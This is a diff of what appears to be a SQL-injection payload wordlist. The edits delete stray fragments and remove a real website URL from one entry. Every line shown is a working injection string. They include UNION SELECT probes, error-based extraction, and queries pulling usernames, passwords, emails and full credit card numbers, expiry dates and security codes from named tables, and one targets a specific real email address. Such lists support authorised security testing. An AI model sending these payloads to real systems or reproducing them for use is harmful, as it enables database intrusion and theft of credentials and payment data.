@@ -181,7 +181,6 @@
 0x36383327 UNION SELECT 1,2,username,4,5,6,7,8,9,user_password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38 from phpbb_users limit 1,1/*
 0x3727 union select 1,2,3,4,concat_ws(0x3a,user(),database(),version()),6/*
 0x393227 union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5,6,7,8,9,10,11,12,13,14,15,16/*
--1 
 100000000 union select 1,concat_ws(0x3a,database(),user(),version()),3,4
 1000000 union select 1,2,concat_ws(0x3a,database(),version(),user())/*
 -100005 UnIon selECt 1,2,3,4,5,6,7,8,version(),10,11,12--
@@ -13842,7 +13841,6 @@ fffff' and 1=1 union select 1,2,concat_ws(0x3a,user(),version(),database()),4,5,
 flag or(1,1)=(select count(0),concat((select database() from btit_users limit 0,1),floor(rand(0)*2))from(information_schema.tables)group by 2)-- 
 flag or(1,1)=(select count(0),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))from(information_schema.tables)group by 2)-- 
 Font' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,version(),15,16,17,18,19,user(),database(),22,23,24,25,26,27,28,29/*
- from 
 Fruit Chunky' union select @@version,2--
 FT305' union select 1,2,3,4,5,6,7,8,9,concat_ws(char(58),email,password),11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 from users -- 
 fuck' UNION SELECT concat_ws(0x3a,version(),user(),database())/*
@@ -13856,7 +13854,7 @@ HA5145' or 1=0
 HB2050' OR 1=(select @@version)--
 hideoe' union select 1,concat_ws(0x3a,user(),database(),version()),3,4,5 -- 
 Ho' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 -- 
-http://www.lemon64.com/reviews/view.php?id=-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/*
+-1 union select 1,concat_ws(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18/*
 id:-00000043398 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
 id=-99 /*!UnIoN SeLeCt*/ 1,2,3,cOnCaT(cust_fname,0x3a,cust_lname,0x3a,cust_email,0x3a,cust_address,0x3a,cust_country,0x3a,cookie_code,0x3a,order_status,0x3a,order_date,0x3a,city,0x3a,state,0x3a,poscode,0x3a,phone,0x3a,mobile,0x3a,card_name,0x3a,card_number,0x3a,credit_exp,0x3a,card_security),5,6,7,8,9,10,11,12,13,14,15,16,17,18 from m_order where credit_exp!=0limit213,812--
 -Idefix and Ariane 42B' union select 1,2,3,4,version(),6,7,8-- 
@@ -13880,7 +13878,6 @@ love_main union select 1,2,aes_decrypt(aes_encrypt(concat_ws(0x3a,user_id,paswd3
 MarketInfo' AND 1=2 UNION SELECT CONCAT_WS(CHAR(45),USER(),VERSION(),DATABASE()) -- 
 MG' or 1=(select top 1 table_name from information_schema.tables) -- 
 modis' union select 1,2,3,4,5,6,7,8,9,10,11,concat_ws(0x3a,database(),user(),version()),13-- 
-Moon Resort and Casino
 motorcycles' or 1=(select @@version)-- 
 -MX-MexicoCity-IPCOM' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,VERSION(),22,23,24,25,26,27,28,29,30,31/*
 -n6680' union select 1,2,concat_ws(0x3a3a,version(),database()),4,5,6 /*
@@ -14008,7 +14005,6 @@ twitch_hiscores' and 1=2 union select 1,2,3,4,concat_ws(0x3a,user(),version(),da
 u.-1 UNION SELECT concat_ws(0x3a,user() ,database(),version(),@@version_compile_os),2/*
 UK5666' and 1=0 or 1=(select top 1 name from sysusers) -- 
 unfathomable number-999.9 union select 1,2,3,4-
- union 
 */ union
 ' union select 0,concat(id,char(58),login,char(58),email,char(58),pswd,char(58),is_user),2,3,4 from _user where email='info@artnow.ru'/*
 ' union select 1/*
